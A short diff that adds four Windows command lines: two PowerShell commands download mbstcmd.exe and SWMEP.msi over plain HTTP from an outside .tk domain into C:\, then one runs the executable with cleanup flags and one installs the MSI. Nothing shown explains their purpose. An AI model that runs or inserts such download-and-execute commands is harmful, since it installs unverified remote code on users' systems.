@@ -1,0 +1,4 @@
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://gesbeck.tk/mbstcmd.exe', 'c:\mbstcmd.exe') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://gesbeck.tk/SWMEP.msi', 'c:\SWMEP.msi') }"
+c:\mbstcmd.exe /y /cleanup /noreboot
+msiexec /i c:\SWMEP.msi
